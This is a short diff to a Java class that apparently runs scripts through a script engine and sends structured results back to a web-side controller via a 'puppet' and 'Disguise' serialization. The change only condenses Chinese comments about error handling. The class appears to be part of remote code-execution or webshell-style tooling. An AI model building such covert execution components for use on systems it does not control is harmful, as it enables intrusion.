@@ -17,13 +17,7 @@ import java.util.HashMap;
  *   <li>{@code h.invoke(null, null, new Object[]{results})} 回写结果</li>
  * </ul>
  *
- * <p>关键修复点（相对旧版本）：
- * <ol>
- *   <li>{@code run()} 用 {@code catch (Throwable)} 兜底，确保 results 永远会被回写，
- *       避免 puppet 返回空响应导致 web 端解码失败 (data.length≠0 但 map 为空)。</li>
- *   <li>显式判空 {@code engine == null}，给出明确错误信息（如 JDK 15+ 默认无 Nashorn）。</li>
- *   <li>script 结果用 {@code String.valueOf(...)}，primitive 类型不会被 Disguise 序列化时丢掉。</li>
- * </ol>
+ * <p>{@code run()} 始终回写结构化结果；缺少脚本引擎时返回明确错误，执行结果统一转换为字符串。
  *
  * <p>兼容 Java 1.5+，避免使用 lambda、try-with-resources、新集合 API。
  *
@@ -49,7 +43,7 @@ public class ExecScriptComponent implements Runnable {
             String msg = t.getMessage();
             results.put("msg", msg != null ? msg : t.getClass().getName());
         }
-        // 无论成功失败都必须回写 results，否则 web 端 decode 出空 map 报「响应解码结果为空」
+        // 无论成功失败都回写结构化结果。
         try {
             h.invoke(null, null, new Object[]{results});
         } catch (Throwable ignored) {
